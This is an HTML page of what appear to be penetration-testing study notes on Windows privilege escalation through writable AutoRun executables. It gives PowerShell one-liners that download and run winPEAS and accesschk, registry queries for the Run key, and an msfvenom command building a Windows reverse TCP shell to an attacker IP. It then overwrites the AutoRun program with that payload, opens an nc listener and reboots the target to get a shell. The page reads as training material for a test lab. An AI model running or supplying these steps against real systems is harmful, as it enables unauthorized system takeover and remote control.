<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AutoRuns</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>AutoRuns</h1><br /><br /><br /><br />• Windows can be configured to run commands at startup, with
    elevated privileges. These “AutoRuns” are configured in the Registry<br />• These AutoRuns are also a <a
      href="hodology--System_Security_(Windows_&_Linux)--Malware--Classification--Trojan_Horse--ncat--reverse_backdoor--persistent_backdoor--manually.html">type
      of malware(persistent backdoor)</a><br /><br /><strong>What we need to escalate privileges:</strong><br /> ◇ able
    to write to an AutoRun executable<br /> ◇ we are able to restart the system (or wait for it to be restarted)<br />
    <br /><br /><br />0. WinPEAS generally check for service misconfigurations: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;applicationsinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1328-1.png" alt="images/1328-1.png" /></a><br /><br />1. enumerate the
    AutoRun executables:<br /> ◇ <strong>reg query</strong>, check manually:<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</div>
    </div><br /> <a href=""><img src="images/1328-2.png" alt="images/1328-2.png" /></a><br /> ◇
    <strong>WinPEAS</strong>, check with tool: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;applicationsinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1328-3.png" alt="images/1328-3.png" /></a><br /> <a href=""><img
        src="images/1328-4.png" alt="images/1328-4.png" /></a><br />2. Verify permissions of the executables:<br /> When
    we have a list of AutoRun program, for each one we need to verify its permissions on the executables<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-wvu&nbsp;&quot;C:\Program&nbsp;Files\Autorun&nbsp;Program\program.exe&quot;&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1328-5.png" alt="images/1328-5.png" /></a><br /> How we can see in this
    case the “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone<br /><br />3.
    Create a backup of the original executables:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;copy&nbsp;&quot;C:\Program&nbsp;Files\Autorun&nbsp;Program\program.exe&quot;&nbsp;C:\Temp</div>
    </div><br />4. Create a reverse shell executable with msfvenom<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;windows/x64/shell_reverse_tcp&nbsp;LHOST=192.168.147.139&nbsp;LPORT=53&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;reverse.exe
      </div>
    </div><br /> <a href=""><img src="images/1328-6.png" alt="images/1328-6.png" /></a><br />5. Copy our reverse shell
    executable to overwrite the AutoRun executable:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;copy&nbsp;/Y&nbsp;C:\PrivEsc\reverse.exe&nbsp;&quot;C:\Program&nbsp;Files\Autorun&nbsp;Program\program.exe&quot;
      </div>
    </div><br /> <a href=""><img src="images/1328-7.png" alt="images/1328-7.png" /></a><br /><br />6. Start a listener
    on Kali<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br /><br />7. restart the target Windows machine to trigger the exploit. <br /> Note on Windows 10: when the
    system restarts it seems to run the AutoRun commands with the privileges of the last logged on user.<br /> In our
    TEST scenario we can avoid the issue by log out from the “user” account and log in as the “admin” account
    first.<br />
  </div>
</body>

</html>